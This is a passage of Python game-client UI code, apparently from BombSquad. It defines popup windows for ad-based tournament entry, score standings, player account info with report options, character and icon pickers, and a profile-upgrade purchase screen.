            bsUtils._showAd('tournament_entry',
                            onCompletionCall=bs.WeakCall(self._onAdComplete),
                            passActuallyShowed=True)

    def _onAdComplete(self, actuallyShowed):

        # make sure any transactions the ad added got locally applied
        # (rewards added, etc.)
        bsInternal._runTransactions()

        # if we're already entering the tourney, ignore..
        if self._entering:
            return

        if not actuallyShowed:
            return

        # this should have awarded us the tournament_entry_ad purchase;
        # make sure that's present..
        # (otherwise the server will ignore our tournament entry anyway)
        if not (bsInternal._getPurchased('tournament_entry_ad')):
            print 'no tournament_entry_ad purchase present in _onAdComplete'
            bs.screenMessage(bs.Lstr(resource='errorText'), color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        self._entering = True
        bsInternal._addTransaction({'type': 'ENTER_TOURNAMENT',
                                    'fee': 'ad',
                                    'tournamentID': self._tournamentID})
        bsInternal._runTransactions()
        self._launch()

    def _onGetTicketsPress(self):
        # if we're already entering, ignore presses..
        if self._entering:
            return

        # bring up get-tickets window and then kill ourself (we're on the
        # overlay layer so we'd show up above it)
        GetTicketsWindow(modal=True, originWidget=self._getTicketsButton)
        self._transitionOut()

    def _onCancel(self):
        # don't allow canceling for several seconds after poking an enter button
        # if it looks like we're waiting on a purchase or entring the tournament
        if ((bs.getRealTime() - self._lastTicketPressTime < 6000)
            and (bsInternal._haveOutstandingTransactions()
                 or bsInternal._getPurchased(self._purchaseName)
                 or self._entering)):
            bs.playSound(bs.getSound('error'))
            return
        self._transitionOut()

    def _transitionOut(self):
        if not self._rootWidget.exists():
            return
        if not self._transitioningOut:
            self._transitioningOut = True
            self._save_state()
            bs.containerWidget(edit=self._rootWidget, transition='outScale')
            if self._onCloseCall is not None:
                self._onCloseCall()

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._onCancel()


class TournamentScoresWindow(PopupWindow):

    def __init__(
            self, tournamentID, tournamentActivity=None, position=(0, 0),
            scale=None, offset=(0, 0),
            tintColor=(1, 1, 1),
            tint2Color=(1, 1, 1),
            selectedCharacter=None, onCloseCall=None):

        self._tournamentID = tournamentID

        self._onCloseCall = onCloseCall
        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._transitioningOut = False

        self._width = 400
        self._height = 300 if gSmallUI else 370 if gMedUI else 450

        bgColor = (0.5, 0.4, 0.6)

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(self._width, self._height),
            scale=scale, bgColor=bgColor, offset=offset)

        env = bs.getEnvironment()

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(50, self._height - 30),
            size=(50, 50),
            scale=0.5, label='', color=bgColor,
            onActivateCall=self._onCancelPress, autoSelect=True,
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 20),
            size=(0, 0),
            hAlign='center', vAlign='center', scale=0.6, text=bs.Lstr(
                resource='tournamentStandingsText'),
            maxWidth=200, color=(1, 1, 1, 0.4))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, size=(self._width - 60, self._height - 70),
            position=(30, 30),
            highlight=False, simpleCullingV=10)
        bs.widget(edit=self._scrollWidget, autoSelect=True)

        self._loadingText = bs.textWidget(
            parent=self._scrollWidget, scale=0.5, text=bs.Lstr(
                value='${A}...',
                subs=[('${A}', bs.Lstr(resource='loadingText'))]),
            size=(self._width - 60, 100),
            hAlign='center', vAlign='center')

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        bsInternal._tournamentQuery(
            args={'tournamentIDs': [tournamentID],
                  'numScores': 50, 'source': 'scores window'},
            callback=bs.WeakCall(self._onTournamentQueryResponse))

    def _onTournamentQueryResponse(self, data):
        if data is not None:
            data = data['t']  # this used to be the whole payload
            # kill our loading text if we've got scores.. otherwise just replace
            # it with 'no scores yet'
            if len(data[0]['scores']) > 0:
                self._loadingText.delete()
            else:
                bs.textWidget(
                    edit=self._loadingText, text=bs.Lstr(
                        resource='noScoresYetText'))
            incr = 30
            subWidth = self._width-90
            subHeight = 30+len(data[0]['scores'])*incr
            self._subContainer = bs.containerWidget(
                parent=self._scrollWidget, size=(subWidth, subHeight),
                background=False)
            for i, entry in enumerate(data[0]['scores']):

                bs.textWidget(parent=self._subContainer,
                              position=(subWidth*0.1-5, subHeight-20-incr*i),
                              maxWidth=20,
                              scale=0.5,
                              color=(0.6, 0.6, 0.7), flatness=1.0, shadow=0.0,
                              text=str(i+1),
                              size=(0, 0),
                              hAlign='right', vAlign='center')

                bs.textWidget(
                    parent=self._subContainer,
                    position=(subWidth * 0.25 - 2, subHeight - 20 - incr * i),
                    maxWidth=subWidth * 0.24, color=(0.9, 1.0, 0.9),
                    flatness=1.0, shadow=0.0, scale=0.6,
                    text=(bsUtils.getTimeString(entry[0] * 10, centi=True)
                          if data[0]['scoreType'] == 'time' else str(
                              entry[0])),
                    size=(0, 0),
                    hAlign='center', vAlign='center')

                t = bs.textWidget(
                    parent=self._subContainer,
                    position=(subWidth * 0.25, subHeight - 20 - incr * i -
                              (0.5 / 0.7) * incr),
                    maxWidth=subWidth * 0.6, scale=0.7, flatness=1.0,
                    shadow=0.0, text=bs.Lstr(value=entry[1]),
                    selectable=True, clickActivate=True, autoSelect=True,
                    extraTouchBorderScale=0.0,
                    size=((subWidth * 0.6) / 0.7, incr / 0.7),
                    hAlign='left', vAlign='center')

                bs.textWidget(
                    edit=t, onActivateCall=bs.Call(
                        self._showPlayerInfo, entry, t))
                if i == 0:
                    bs.widget(edit=t, upWidget=self._cancelButton)

    def _showPlayerInfo(self, entry, textWidget):
        # for the moment we only work if a single player-info is present..
        if len(entry[2]) != 1:
            bs.playSound(bs.getSound('error'))
            return
        bs.playSound(bs.getSound('swish'))
        AccountInfoWindow(accountID=entry[2][0].get('a', None),
                          profileID=entry[2][0].get('p', None),
                          position=textWidget.getScreenSpaceCenter())
        self._transitionOut()

    def _onCancelPress(self):
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            # self._save_state()
            bs.containerWidget(edit=self._rootWidget, transition='outScale')
            if self._onCloseCall is not None:
                self._onCloseCall()

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class AccountInfoWindow(PopupWindow):

    def __init__(
            self, accountID, profileID=None, position=(0, 0),
            scale=None, offset=(0, 0)):

        self._accountID = accountID
        self._profileID = profileID

        if scale is None:
            scale = 2.6 if gSmallUI else 1.8 if gMedUI else 1.4
        self._transitioningOut = False

        self._width = 400
        self._height = 300 if gSmallUI else 400 if gMedUI else 450

        bgColor = (0.5, 0.4, 0.6)

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(self._width, self._height),
            scale=scale, bgColor=bgColor, offset=offset)

        env = bs.getEnvironment()

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(50, self._height - 30),
            size=(50, 50),
            scale=0.5, label='', color=bgColor,
            onActivateCall=self._onCancelPress, autoSelect=True,
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 20),
            size=(0, 0),
            hAlign='center', vAlign='center', scale=0.6, text=bs.Lstr(
                resource='playerInfoText'),
            maxWidth=200, color=(0.7, 0.7, 0.7, 0.7))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, size=(self._width - 60, self._height - 70),
            position=(30, 30),
            captureArrows=True, simpleCullingV=10)
        bs.widget(edit=self._scrollWidget, autoSelect=True)

        self._loadingText = bs.textWidget(
            parent=self._scrollWidget, scale=0.5, text=bs.Lstr(
                value='${A}...',
                subs=[('${A}', bs.Lstr(resource='loadingText'))]),
            size=(self._width - 60, 100),
            hAlign='center', vAlign='center')

        # in cases where the user most likely has a browser/email, lets
        # offer a 'report this user' button..
        if (bsUtils.isBrowserLikelyAvailable()
            and bsInternal._getAccountMiscReadVal(
                'showAccountExtrasMenu', False)):

            self._extrasMenuButton = b = bs.buttonWidget(
                parent=self._rootWidget, size=(20, 20),
                position=(self._width - 60, self._height - 30),
                autoSelect=True, label='...', buttonType='square',
                color=(0.64, 0.52, 0.69),
                textColor=(0.57, 0.47, 0.57),
                onActivateCall=self._onExtrasMenuPress)

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        bsUtils.serverGet(
            'bsAccountInfo',
            {'buildNumber': bs.getEnvironment()['buildNumber'],
             'accountID': repr(self._accountID),
             'profileID': repr(self._profileID)},
            callback=bs.WeakCall(self._onQueryResponse))

    def popupMenuSelectedChoice(self, window, choice):
        if choice == 'more':
            self._onMorePress()
        elif choice == 'report':
            self._onReportPress()
        elif choice == 'ban':
            self._onBanPress()
        else:
            print 'ERROR: unknown account info extras menu item:', choice

    def popupMenuClosing(self, window):
        pass

    def _onExtrasMenuPress(self):
        choices = ['more', 'report']
        choicesDisplay = [bs.Lstr(resource='coopSelectWindow.seeMoreText'),
                          bs.Lstr(resource='reportThisPlayerText')]
        isAdmin = False
        if isAdmin:
            print 'ADMIN', bs.getAccountMiscReadVal2('admin')
            bs.screenMessage('TEMP FORCING ADMIN ON')
            choices.append('ban')
            choicesDisplay.append(bs.Lstr(resource='banThisPlayerText'))

        PopupMenuWindow(position=self._extrasMenuButton.getScreenSpaceCenter(),
                        scale=2.3 if gSmallUI else 1.65 if gMedUI else 1.23,
                        choices=choices,
                        choicesDisplay=choicesDisplay,
                        currentChoice='more',
                        delegate=self).getRootWidget()

    def _onBanPress(self):
        bsInternal._addTransaction({'type': 'BAN_ACCOUNT',
                                    'account': self._accountID})
        bsInternal._runTransactions()

    def _onReportPress(self):
        import bsUI2
        bsUI2.ReportPlayerWindow(
            self._accountID, originWidget=self._extrasMenuButton)

    def _onMorePress(self):
        bs.openURL(bsInternal._get_master_server_address(
        )+'/highscores?profile='+self._accountID)

    def _onQueryResponse(self, data):
        if data is None:
            bs.textWidget(edit=self._loadingText, text=bs.Lstr(
                resource='internal.unavailableNoConnectionText'))
        else:
            try:
                # at some point should actually get this as json; prepping
                # for that..
                data = bsUtils.jsonPrep(data)
                import bsAchievement
                import bsSpaz
                self._loadingText.delete()
                ts = ''
                try:
                    ts = data['trophies']
                    n = 10
                    chunks = [ts[i:i + n] for i in range(0, len(ts), n)]
                    ts = ('\n\n'.join(chunks))
                    if ts == '':
                        ts = '-'
                except Exception:
                    bs.printException("Error displaying trophies")
                accountNameSpacing = 15
                tscale = 0.65
                tsHeight = bsInternal._getStringHeight(ts, suppressWarning=True)
                subWidth = self._width-80
                subHeight = 200 + tsHeight * tscale + \
                    accountNameSpacing * len(data['accountDisplayStrings'])
                self._subContainer = bs.containerWidget(
                    parent=self._scrollWidget, size=(subWidth, subHeight),
                    background=False)
                v = subHeight - 20

                titleScale = 0.37
                center = 0.5
                maxWidthScale = 0.9
                center = 0.3
                maxWidthScale = 0.45
                showingCharacter = False
                if data['profileDisplayString'] is not None:
                    tintColor = (1, 1, 1)
                    try:
                        if data['profile'] is not None:
                            profile = data['profile']
                            character = bsSpaz.appearances.get(
                                profile['character'], None)
                            if character is not None:
                                tintColor = (profile['color']
                                             if 'color' in profile
                                             else (1, 1, 1))
                                tint2Color = (profile['highlight']
                                              if 'highlight' in profile
                                              else (1, 1, 1))
                                iconTex = character.iconTexture
                                tintTex = character.iconMaskTexture
                                maskTexture = bs.getTexture('characterIconMask')
                                bs.imageWidget(
                                    parent=self._subContainer,
                                    position=(subWidth * center - 40, v - 80),
                                    size=(80, 80),
                                    color=(1, 1, 1),
                                    maskTexture=maskTexture,
                                    texture=bs.getTexture(iconTex),
                                    tintTexture=bs.getTexture(tintTex),
                                    tintColor=tintColor, tint2Color=tint2Color)
                                v -= 95
                    except Exception:
                        bs.printException("Error displaying character")
                    bs.textWidget(
                        parent=self._subContainer, size=(0, 0),
                        position=(subWidth * center, v),
                        hAlign='center', vAlign='center', scale=0.9,
                        color=bs.getSafeColor(tintColor, 0.7),
                        shadow=1.0, text=bs.Lstr(
                            value=data['profileDisplayString']),
                        maxWidth=subWidth * maxWidthScale * 0.75)
                    showingCharacter = True
                    v -= 33

                center = 0.75 if showingCharacter else 0.5
                maxWidthScale = 0.45 if showingCharacter else 0.9

                v = subHeight - 20
                if len(data['accountDisplayStrings']) <= 1:
                    accountTitle = bs.Lstr(
                        resource='settingsWindow.accountText')
                else:
                    accountTitle = bs.Lstr(
                        resource='accountSettingsWindow.accountsText',
                        fallbackResource='settingsWindow.accountText')
                bs.textWidget(
                    parent=self._subContainer, size=(0, 0),
                    position=(subWidth * center, v),
                    flatness=1.0, hAlign='center', vAlign='center',
                    scale=titleScale, color=gInfoTextColor, text=accountTitle,
                    maxWidth=subWidth * maxWidthScale)
                drawSmall = True if (showingCharacter or len(
                    data['accountDisplayStrings']) > 1) else False
                v -= 14 if drawSmall else 20
                for accountString in data['accountDisplayStrings']:
                    bs.textWidget(
                        parent=self._subContainer, size=(0, 0),
                        position=(subWidth * center, v),
                        hAlign='center', vAlign='center', scale=0.55
                        if drawSmall else 0.8, text=accountString,
                        maxWidth=subWidth * maxWidthScale)
                    v -= accountNameSpacing

                v += accountNameSpacing
                v -= 25 if showingCharacter else 29

                bs.textWidget(
                    parent=self._subContainer, size=(0, 0),
                    position=(subWidth * center, v),
                    flatness=1.0, hAlign='center', vAlign='center',
                    scale=titleScale, color=gInfoTextColor, text=bs.Lstr(
                        resource='rankText'),
                    maxWidth=subWidth * maxWidthScale)
                v -= 14
                if data['rank'] is None:
                    rankStr = '-'
                    suffixOffset = None
                else:
                    strRaw = bs.Lstr(
                        resource='league.rankInLeagueText').evaluate()
                    # FIXME - would be nice to not have to eval this
                    rankStr = bs.Lstr(
                        resource='league.rankInLeagueText',
                        subs=[('${RANK}', str(data['rank'][2])),
                              ('${NAME}', bs.Lstr(
                                  translate=('leagueNames', data['rank']
                                             [0]))),
                              ('${SUFFIX}', '')]).evaluate()
                    rankStrWidth = min(
                        subWidth*maxWidthScale,
                        bsInternal._getStringWidth(
                            rankStr, suppressWarning=True) * 0.55)
                    # only tack our suffix on if its at the end and only for
                    # non-diamond leagues
                    if (strRaw.endswith('${SUFFIX}')
                            and data['rank'][0] != 'Diamond'):
                        suffixOffset = rankStrWidth*0.5+2
                    else:
                        suffixOffset = None

                bs.textWidget(
                    parent=self._subContainer, size=(0, 0),
                    position=(subWidth * center, v),
                    hAlign='center', vAlign='center', scale=0.55, text=rankStr,
                    maxWidth=subWidth * maxWidthScale)
                if suffixOffset is not None:
                    bs.textWidget(
                        parent=self._subContainer, size=(0, 0),
                        position=(subWidth * center + suffixOffset, v + 3),
                        hAlign='left', vAlign='center', scale=0.29,
                        flatness=1.0, text='[' + str(data['rank'][1]) + ']')
                v -= 14

                strRaw = bs.Lstr(resource='league.rankInLeagueText').evaluate()
                oldOffs = -50
                prevRanksShown = 0
                for prevRank in data['prevRanks']:
                    rankStr = bs.Lstr(
                        value='${S}:    ${I}',
                        subs=[('${S}', bs.Lstr(
                            resource='league.seasonText',
                            subs=[('${NUMBER}', str(prevRank[0]))])),
                            ('${I}', bs.Lstr(
                                resource='league.rankInLeagueText',
                                subs=[('${RANK}', str(prevRank[3])),
                                      ('${NAME}', bs.Lstr(
                                          translate=('leagueNames',
                                                     prevRank[1]))),
                                      ('${SUFFIX}', '')]))]).evaluate()
                    rankStrWidth = min(
                        subWidth*maxWidthScale,
                        bsInternal._getStringWidth(
                            rankStr, suppressWarning=True) * 0.3)
                    # only tack our suffix on if its at the end and only for
                    # non-diamond leagues
                    if (strRaw.endswith('${SUFFIX}')
                            and prevRank[1] != 'Diamond'):
                        suffixOffset = rankStrWidth+2
                    else:
                        suffixOffset = None
                    bs.textWidget(
                        parent=self._subContainer, size=(0, 0),
                        position=(subWidth * center + oldOffs, v),
                        hAlign='left', vAlign='center', scale=0.3, text=rankStr,
                        flatness=1.0, maxWidth=subWidth * maxWidthScale)
                    if suffixOffset is not None:
                        bs.textWidget(
                            parent=self._subContainer, size=(0, 0),
                            position=(subWidth * center + oldOffs
                                      + suffixOffset, v + 1),
                            hAlign='left', vAlign='center', scale=0.20,
                            flatness=1.0, text='[' + str(prevRank[2]) + ']')
                    prevRanksShown += 1
                    v -= 10

                v -= 13

                bs.textWidget(
                    parent=self._subContainer, size=(0, 0),
                    position=(subWidth * center, v),
                    flatness=1.0, hAlign='center', vAlign='center',
                    scale=titleScale, color=gInfoTextColor, text=bs.Lstr(
                        resource='achievementsText'),
                    maxWidth=subWidth * maxWidthScale)
                v -= 14
                bs.textWidget(
                    parent=self._subContainer, size=(0, 0),
                    position=(subWidth * center, v),
                    hAlign='center', vAlign='center', scale=0.55,
                    text=str(data['achievementsCompleted']) + ' / ' +
                    str(len(bsAchievement.gAchievements)),
                    maxWidth=subWidth * maxWidthScale)
                v -= 25

                if prevRanksShown == 0 and showingCharacter:
                    v -= 20
                elif prevRanksShown == 1 and showingCharacter:
                    v -= 10

                center = 0.5
                maxWidthScale = 0.9

                bs.textWidget(
                    parent=self._subContainer, size=(0, 0),
                    position=(subWidth * center, v),
                    hAlign='center', vAlign='center', scale=titleScale,
                    color=gInfoTextColor, flatness=1.0, text=bs.Lstr(
                        resource='trophiesThisSeasonText',
                        fallbackResource='trophiesText'),
                    maxWidth=subWidth * maxWidthScale)
                v -= 19
                bs.textWidget(
                    parent=self._subContainer, size=(0, tsHeight),
                    position=(subWidth * 0.5, v - tsHeight * tscale),
                    hAlign='center', vAlign='top', cornerScale=tscale, text=ts)

            except Exception:
                bs.printException('Error displaying account info')

    def _onCancelPress(self):
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class CharacterPicker(PopupWindow):

    def __init__(
            self, parent, position=(0, 0),
            delegate=None, scale=None, offset=(0, 0),
            tintColor=(1, 1, 1),
            tint2Color=(1, 1, 1),
            selectedCharacter=None):
        if scale is None:
            scale = 1.85 if gSmallUI else 1.65 if gMedUI else 1.23

        self._delegate = delegate
        self._transitioningOut = False

        # make a list of spaz icons
        self._spazzes = bsSpaz.getAppearances()
        self._spazzes.sort()
        self._iconTextures = [
            bs.getTexture(bsSpaz.appearances[s].iconTexture)
            for s in self._spazzes]
        self._iconTintTextures = [
            bs.getTexture(bsSpaz.appearances[s].iconMaskTexture)
            for s in self._spazzes]

        count = len(self._spazzes)

        columns = 3
        rows = int(math.ceil(float(count)/columns))

        buttonWidth = 100
        buttonHeight = 100
        buttonBufferH = 10
        buttonBufferV = 15

        self._width = (10+columns*(buttonWidth+2*buttonBufferH)
                       * (1.0/0.95)*(1.0/0.8))
        self._height = self._width*(0.8 if gSmallUI else 1.06)

        self._scrollWidth = self._width * 0.8
        self._scrollHeight = self._height * 0.8
        self._scrollPosition = (
            (self._width - self._scrollWidth) * 0.5,
            (self._height - self._scrollHeight) * 0.5)

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(self._width, self._height),
            scale=scale, bgColor=(0.5, 0.5, 0.5),
            offset=offset, focusPosition=self._scrollPosition,
            focusSize=(self._scrollWidth, self._scrollHeight))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            size=(self._scrollWidth, self._scrollHeight),
            color=(0.55, 0.55, 0.55),
            highlight=False, position=self._scrollPosition)
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)

        self._subWidth = self._scrollWidth*0.95
        self._subHeight = 5+rows*(buttonHeight+2*buttonBufferV) + 100
        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget,
            size=(self._subWidth, self._subHeight), background=False)
        index = 0
        maskTexture = bs.getTexture('characterIconMask')
        for y in range(rows):
            for x in range(columns):
                pos = (x*(buttonWidth+2*buttonBufferH)+buttonBufferH,
                       self._subHeight - (y+1)*(buttonHeight+2*buttonBufferV)
                       + 12)
                b = bs.buttonWidget(
                    parent=self._subContainer, buttonType='square',
                    size=(buttonWidth, buttonHeight),
                    autoSelect=True, texture=self._iconTextures[index],
                    tintTexture=self._iconTintTextures[index],
                    maskTexture=maskTexture, label='', color=(1, 1, 1),
                    tintColor=tintColor, tint2Color=tint2Color,
                    onActivateCall=bs.Call(
                        self._selectCharacter, self._spazzes[index]),
                    position=pos)
                bs.widget(edit=b, showBufferTop=60, showBufferBottom=60)
                if self._spazzes[index] == selectedCharacter:
                    bs.containerWidget(
                        edit=self._subContainer, selectedChild=b,
                        visibleChild=b)
                name = bs.Lstr(translate=(
                    'characterNames', self._spazzes[index]))
                bs.textWidget(
                    parent=self._subContainer, text=name,
                    position=(pos[0] + buttonWidth * 0.5, pos[1] - 12),
                    size=(0, 0),
                    scale=0.5, maxWidth=buttonWidth, drawController=b,
                    hAlign='center', vAlign='center',
                    color=(0.8, 0.8, 0.8, 0.8))
                index += 1

                if index >= count:
                    break
            if index >= count:
                break
        self._getMoreCharactersButton = b = bs.buttonWidget(
            parent=self._subContainer, size=(self._subWidth * 0.8, 60),
            position=(self._subWidth * 0.1, 30),
            label=bs.Lstr(
                resource='editProfileWindow.getMoreCharactersText'),
            onActivateCall=self._onStorePress, color=(0.6, 0.6, 0.6),
            textColor=(0.8, 0.8, 0.8),
            autoSelect=True)
        bs.widget(edit=b, showBufferTop=30, showBufferBottom=30)

    def _onStorePress(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._transitionOut()
        StoreWindow(modal=True, showTab='characters',
                    originWidget=self._getMoreCharactersButton)

    def _selectCharacter(self, character):
        if self._delegate is not None:
            self._delegate.onCharacterPickerPick(character)
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class IconPicker(PopupWindow):

    def __init__(
            self, parent, position=(0, 0),
            delegate=None, scale=None, offset=(0, 0),
            tintColor=(1, 1, 1),
            tint2Color=(1, 1, 1),
            selectedIcon=None):
        if scale is None:
            scale = 1.85 if gSmallUI else 1.65 if gMedUI else 1.23

        self._delegate = delegate
        self._transitioningOut = False

        self._icons = [bs.getSpecialChar('logo')] + _getPurchasedIcons()
        count = len(self._icons)
        columns = 4
        rows = int(math.ceil(float(count)/columns))

        buttonWidth = 50
        buttonHeight = 50
        buttonBufferH = 10
        buttonBufferV = 5

        self._width = (10+columns*(buttonWidth+2*buttonBufferH)
                       * (1.0/0.95)*(1.0/0.8))
        self._height = self._width*(0.8 if gSmallUI else 1.06)

        self._scrollWidth = self._width * 0.8
        self._scrollHeight = self._height * 0.8
        self._scrollPosition = (
            (self._width - self._scrollWidth) * 0.5,
            (self._height - self._scrollHeight) * 0.5)

        # creates our _rootWidget
        PopupWindow.__init__(
            self, position=position, size=(self._width, self._height),
            scale=scale, bgColor=(0.5, 0.5, 0.5),
            offset=offset, focusPosition=self._scrollPosition,
            focusSize=(self._scrollWidth, self._scrollHeight))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            size=(self._scrollWidth, self._scrollHeight),
            color=(0.55, 0.55, 0.55),
            highlight=False, position=self._scrollPosition)
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)

        self._subWidth = self._scrollWidth*0.95
        self._subHeight = 5+rows*(buttonHeight+2*buttonBufferV) + 100
        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget,
            size=(self._subWidth, self._subHeight),
            background=False)
        index = 0
        for y in range(rows):
            for x in range(columns):
                pos = (x*(buttonWidth+2*buttonBufferH)+buttonBufferH,
                       self._subHeight - (y+1)*(buttonHeight+2*buttonBufferV)+0)
                b = bs.buttonWidget(
                    parent=self._subContainer, buttonType='square',
                    size=(buttonWidth, buttonHeight),
                    autoSelect=True, textScale=1.2, label='',
                    color=(0.65, 0.65, 0.65),
                    onActivateCall=bs.Call(
                        self._selectIcon, self._icons[index]),
                    position=pos)
                bs.textWidget(
                    parent=self._subContainer, hAlign='center', vAlign='center',
                    size=(0, 0),
                    position=(pos[0] + 0.5 * buttonWidth - 1, pos[1] + 15),
                    drawController=b, text=self._icons[index],
                    scale=1.8)
                bs.widget(edit=b, showBufferTop=60, showBufferBottom=60)
                if self._icons[index] == selectedIcon:
                    bs.containerWidget(
                        edit=self._subContainer, selectedChild=b,
                        visibleChild=b)
                index += 1

                if index >= count:
                    break
            if index >= count:
                break
        self._getMoreIconsButton = b = bs.buttonWidget(
            parent=self._subContainer, size=(self._subWidth * 0.8, 60),
            position=(self._subWidth * 0.1, 30),
            label=bs.Lstr(resource='editProfileWindow.getMoreIconsText'),
            onActivateCall=self._onStorePress, color=(0.6, 0.6, 0.6),
            textColor=(0.8, 0.8, 0.8),
            autoSelect=True)
        bs.widget(edit=b, showBufferTop=30, showBufferBottom=30)

    def _onStorePress(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._transitionOut()
        StoreWindow(modal=True, showTab='icons',
                    originWidget=self._getMoreIconsButton)

    def _selectIcon(self, icon):
        if self._delegate is not None:
            self._delegate.onIconPickerPick(icon)
        self._transitionOut()

    def _transitionOut(self):
        if not self._transitioningOut:
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')

    def onPopupCancel(self):
        bs.playSound(bs.getSound('swish'))
        self._transitionOut()


class UpgradeProfileWindow(Window):

    def __init__(self, editProfileWindow, transition='inRight'):

        self._r = 'editProfileWindow'

        self._width = 680
        self._height = 350
        self._baseScale = 2.05 if gSmallUI else 1.5 if gMedUI else 1.2
        self._upgradeStartTime = None
        self._name = editProfileWindow.getName()

        self._editProfileWindow = weakref.ref(editProfileWindow)

        topExtra = 15 if gSmallUI else 15
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            toolbarVisibility='MENU_CURRENCY', transition=transition,
            scale=self._baseScale, stackOffset=(0, 15) if gSmallUI else(0, 0))
        cancelButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(52, 30),
            size=(155, 60),
            scale=0.8, autoSelect=True, label=bs.Lstr(
                resource='cancelText'),
            onActivateCall=self._cancel)
        self._upgradeButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(self._width - 190, 30),
            size=(155, 60),
            scale=0.8, autoSelect=True, label=bs.Lstr(
                resource='upgradeText'),
            onActivateCall=self._onUpgradePress)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=cancelButton,
            startButton=self._upgradeButton, selectedChild=self._upgradeButton)

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 38),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.upgradeToGlobalProfileText'),
            color=gTitleColor, maxWidth=self._width * 0.45, scale=1.0,
            hAlign="center", vAlign="center")

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 100),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.upgradeProfileInfoText'),
            color=gInfoTextColor, maxWidth=self._width * 0.8, scale=0.7,
            hAlign="center", vAlign="center")

        self._status_text = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 160),
            size=(0, 0),
            text=bs.Lstr(
                resource=self._r + '.checkingAvailabilityText',
                subs=[('${NAME}', self._name)]),
            color=(0.8, 0.4, 0.0),
            maxWidth=self._width * 0.8, scale=0.65, hAlign="center",
            vAlign="center")

        self._priceText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 230),
            size=(0, 0),
            text='', color=(0.2, 1, 0.2),
            maxWidth=self._width * 0.8, scale=1.5, hAlign="center",
            vAlign="center")

        if not gToolbars:
            self._ticketsText = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.9 - 5, self._height - 30),
                size=(0, 0),
                text=bs.getSpecialChar('ticket') + '123', color=(0.2, 1, 0.2),
                maxWidth=100, scale=0.5, hAlign="right", vAlign="center")
        else:
            self._ticketsText = None

        bsUtils.serverGet('bsGlobalProfileCheck', {'name': self._name},
                          callback=bs.WeakCall(self._profileCheckResult))
        self._cost = bsInternal._getAccountMiscReadVal(
            'price.global_profile', 500)
        self._status = 'waiting'
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

    def _profileCheckResult(self, result):
        if result is None:
            bs.textWidget(
                edit=self._status_text, text=bs.Lstr(
                    resource='internal.unavailableNoConnectionText'),
                color=(1, 0, 0))
            self._status = 'error'
            bs.buttonWidget(edit=self._upgradeButton, color=(
                0.4, 0.4, 0.4), textColor=(0.5, 0.5, 0.5))
        else:
            if result['available']:
                bs.textWidget(
                    edit=self._status_text, text=bs.Lstr(
                        resource=self._r + '.availableText',
                        subs=[('${NAME}', self._name)]),
                    color=(0, 1, 0))
                bs.textWidget(edit=self._priceText, text=bs.getSpecialChar(
                    'ticket') + str(self._cost))
                self._status = None
            else:
                bs.textWidget(
                    edit=self._status_text, text=bs.Lstr(
                        resource=self._r + '.unavailableText',
                        subs=[('${NAME}', self._name)]),
                    color=(1, 0, 0))
                self._status = 'unavailable'
                bs.buttonWidget(edit=self._upgradeButton, color=(
                    0.4, 0.4, 0.4), textColor=(0.5, 0.5, 0.5))

    def _onUpgradePress(self):
        if self._status is None:
            # if it appears we don't have enough tickets, offer to buy more
            tickets = bsInternal._getAccountTicketCount()
            if tickets < self._cost:
                bs.playSound(bs.getSound('error'))
                showGetTicketsPrompt()
                return
            bs.screenMessage(
                bs.Lstr(resource='purchasingText'),
                color=(0, 1, 0))
            self._status = 'pre_upgrading'

            # now we tell the original editor to save the profile, add an
